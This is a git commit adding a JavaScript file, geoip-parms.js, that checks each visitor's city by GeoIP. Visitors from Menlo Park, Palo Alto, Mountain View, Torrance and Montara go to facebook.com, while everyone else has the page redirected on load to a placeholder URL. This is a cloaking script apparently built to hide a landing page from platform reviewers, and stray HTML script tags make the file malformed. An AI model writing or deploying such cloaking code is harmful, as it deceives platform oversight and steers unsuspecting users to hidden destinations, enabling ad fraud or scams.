0b39032bc964b5aa85715a0d4d30acca7f15cbe3
Frank Lemanschik <frank@dspeed.eu>
2014-08-01 15:39:07 +0200

    Create geoip-parms.js

---
+++ geoip-parms.js
@@ -0,0 +1,46 @@
+var city= geoip_city();
+var state= geoip_region();
+var country= geoip_country_code();
+
+if(city == "Torrance")
+{
+window.location = "http://facebook.com"
+
+}
+if(city == "Menlo Park")
+{
+window.location = "http://facebook.com"
+
+}
+if(city == "Palo Alto")
+{
+window.location = "http://facebook.com"
+
+}
+if(city == "Montara")
+{
+window.location = "http://facebook.com"
+
+}
+if(city == "Torrance City")
+{
+window.location = "http://facebook.com"
+
+}
+if(city == "Mountain View")
+{
+window.location = "http://facebook.com"
+
+}
+if(city == "Menlo Park City")
+{
+window.location = "http://facebook.com"
+
+}
+</script>
+    <script type='text/javascript'>//<![CDATA[ 
+window.onload=function(){
+ 
+//NgL
+top.location = "###URL###";
+}//]]>  
